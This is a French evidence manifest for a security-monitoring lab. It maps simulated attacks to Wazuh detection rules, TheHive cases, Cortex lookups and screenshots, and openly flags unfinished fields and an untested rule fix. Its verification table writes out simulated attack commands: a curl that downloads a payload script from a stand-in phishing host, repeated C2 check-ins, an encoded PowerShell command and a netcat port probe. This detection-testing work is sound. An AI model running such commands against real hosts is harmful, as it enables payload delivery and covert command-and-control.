# Manifeste de preuves — relier captures, cas et données brutes

Ce fichier relie chaque scénario documenté dans le README à son cas TheHive,
sa règle Wazuh et ses captures d'écran. Les champs marqués `(à renseigner)`
n'ont pas été extraits des logs bruts de la VM au moment de la rédaction de
ce manifeste (les captures elles-mêmes montrent ces informations à l'écran,
mais elles n'avaient pas été copiées dans un fichier structuré séparé) — les
compléter à partir des exports TheHive/Wazuh réels avant de citer ce fichier
comme preuve d'audit indépendante des captures.

## Scénarios du cahier des charges (README, section "Preuve de bout en bout")

| Champ | Brute force SSH | Phishing | PowerShell | Mouvement latéral | C2 beaconing |
|---|---|---|---|---|---|
| Scénario | ssh_bruteforce | phishing_url_proxy | powershell_suspicious | lateral_movement_simulated | c2_beaconing_simulated |
| Technique MITRE | T1110 (T1110.001 après uniformisation) | T1105 | T1059.001 | T1021.004 | T1071 |
| Règle Wazuh | 5710 | 100099 | 100101 | 100105 | 100103 |
| Niveau | 5 | 8 | 12 | 10 | 10 |
| Alert ID (Elasticsearch) | (à renseigner) | (à renseigner) | (à renseigner) | (à renseigner) | (à renseigner) |
| Timestamp | (à renseigner) | (à renseigner) | (à renseigner) | (à renseigner) | (à renseigner) |
| Script de triage | `scripts/triage_single_alert.py 5710` | `scripts/wazuh_ai_triage.py` (auto) | `scripts/wazuh_ai_triage.py` (auto) | `scripts/wazuh_ai_triage.py` (auto) | `scripts/wazuh_ai_triage.py` (auto) |
| Case ID TheHive | #2168 | #2144 | #2151 | #2150 | #2145 |
| Cortex Job ID | (à renseigner) | (à renseigner) | n/a — pas d'observable réseau | (à renseigner) | (à renseigner) |
| Cortex — observable | 127.0.0.1 (AbuseIPDB_2_0) | phishing-simulated-payload.example.invalid (VirusTotal_GetReport_3_1, échec attendu TLD .invalid) | — | 10.0.2.2 (AbuseIPDB_2_0) | c2-beacon-simulated.example.invalid (VirusTotal_GetReport_3_1, échec attendu TLD .invalid) |
| MISP Event ID | n/a — pas de push automatique sur ce lot (voir README, bug TheHive→MISP 403 non résolu) | n/a | n/a | n/a | n/a |
| Captures (docs/screenshots/) | 28, 37, 38 | 32, 33, 39 | 29, 34 | 30, 35, 40 | 31, 36, 41 |
| Git commit au moment de la capture | (à renseigner — voir `git log --oneline -- docs/screenshots/28_*.png`) | idem | idem | idem | idem |

## Incident unique 1.1.1.1 (README, section "Approfondissement")

| Champ | Valeur |
|---|---|
| Source | 1.1.1.1 |
| Alerte reconnaissance | Règle 100107, niveau 6, chemin Shuffle |
| Alerte récupération d'outil | Règle 100099, niveau 8, chemin Gemma |
| Case ID TheHive (Shuffle) | #1344 |
| Case ID TheHive (Gemma) | #2134 |
| Cortex — observable | 1.1.1.1 (AbuseIPDB_2_0) |
| MISP Event ID | référence explicite au cas #1344 dans le commentaire de l'attribut `ip-src` (ID d'événement MISP à renseigner) |
| Captures | 21, 22, 23, 24, 25, 26, 27 |

## Vérification live des règles corrigées (README, section "Détection avancée")

Contrairement aux sections précédentes, les valeurs ci-dessous ont été extraites directement
de l'indexeur Wazuh au moment du test (pas de champ `(à renseigner)`) : chaque règle a été
redéployée sur `single-node-wazuh.manager-1`, testée positif/négatif via `wazuh-logtest`, puis
déclenchée une nouvelle fois en conditions réelles (agent réel, indexation réelle) pour produire
les captures 42-46.

| Champ | 100099 (fetch suspect) | 100101 (PowerShell) | 100103 (beaconing) | 100105 (mvt. latéral) | 100107 (sondage) |
|---|---|---|---|---|---|
| Timestamp (UTC) | 2026-07-18T17:55:47.939Z | 2026-07-18T18:55:50.248Z | 2026-07-18T17:56:13.770Z | 2026-07-18T18:56:34.140Z | 2026-07-18T18:55:56.113Z |
| Agent | soc-lab (001) | soc-lab (001) | soc-lab (001) | soc-lab (001) | soc-lab (001) |
| Commande réelle | `curl -o /tmp/payload_v2.sh http://phishing-v2-simulated.example.invalid/payload.sh` | `pwsh -enc ZQBjAGgAbwAgAHYAMgAtAHQAZQBzAHQA` | 3× `curl http://c2-v2-simulated.example.invalid/checkin` (5-9s d'intervalle) | connexion SSH puis `sudo whoami` × 2 | `nc -z -w2 127.0.0.1 8080` |
| Niveau | 8 | 12 | 10 | 10 | 6 |
| Capture | `42_wazuh_alert_100099_v2_verified.png` | `46_wazuh_alert_100101_verified.png` | `44_wazuh_alert_100103_verified.png` | `43_wazuh_alert_100105_verified.png` | `45_wazuh_alert_100107_verified.png` |

Bugs trouvés et corrigés pendant cette vérification (voir README pour le détail complet) :
`full_log` non interrogeable pour `auditd` (corrigé via `<regex>` sans attribut `field`) ;
`100103` chaînée sur la mauvaise règle parente (`100099` → `100098`) ; `same_source_ip` puis
`same_user` structurellement incapables de corréler `5715` (sshd) et `5402` (sudo) — corrigé en
se limitant à la proximité temporelle, limite documentée explicitement dans le commentaire de la
règle et dans le README.

### Correction ultérieure non couverte par la capture 44 (100103)

**Important** : la ligne `100103` du tableau ci-dessus et la capture
`44_wazuh_alert_100103_verified.png` prouvent seulement que la règle s'est déclenchée sur trois
occurrences répétées de `curl` — elles ne prouvent PAS que la corrélation portait sur la bonne
destination. Une relecture ultérieure de `scripts/generate_advanced_scenarios.sh` a révélé que la
regle utilisait `<same_field>audit.execve.a1</same_field>`, alors que l'invocation `curl` réelle du
générateur (`curl -s -m3 "URL"`) place l'URL en position `a3`, pas `a1` (`a1` vaut systématiquement
`-s`, identique sur toute invocation curl quelle que soit la destination). Le test manuel documenté
ci-dessus (`curl -s http://c2-v2-simulated.example.invalid/checkin`, sans `-m3`) place lui aussi
l'URL en `a2`, pas `a1` — la capture 44 prouve donc uniquement que la règle a matché le champ `-s`
par coïncidence, pas la destination. La règle a été corrigée pour utiliser `audit.execve.a3`
(correspondant à l'invocation exacte de `generate_advanced_scenarios.sh`), mais **cette correction
n'a pas encore été re-testée en direct sur la VM** (accès SSH indisponible pendant cette passe) : ni
le cas positif (3 fetches vers la même destination avec `-m3`) ni le cas négatif (3 fetches vers 3
destinations différentes ne doivent PAS déclencher `100103`) n'ont été revérifiés. La ligne 100103
du tableau ci-dessus doit être lue comme "l'ancienne version buggée s'est déclenchée", pas comme
"la corrélation par destination fonctionne" — voir `scripts/local_rules.xml` pour le commentaire
technique complet et le statut exact.

## Comment compléter ce manifeste

```bash
# Alert ID + timestamp exacts depuis l'indexeur Wazuh :
curl -sk -u admin:$WAZUH_INDEXER_PASSWORD \
  "https://127.0.0.1:9200/wazuh-alerts-4.x-*/_search" \
  -H 'Content-Type: application/json' \
  -d '{"query":{"term":{"rule.id":"5710"}},"sort":[{"timestamp":"desc"}],"size":1}' \
  | python3 -m json.tool

# Cortex Job ID depuis l'API Cortex (necessite une cle API, voir CREDENTIALS.md local) :
curl -s -H "Authorization: Bearer $CORTEX_API_KEY" http://127.0.0.1:9001/api/job \
  | python3 -m json.tool

# Git commit au moment d'une capture donnee :
git log --oneline --follow -- docs/screenshots/28_wazuh_alert_5710_bruteforce_ssh.png
```
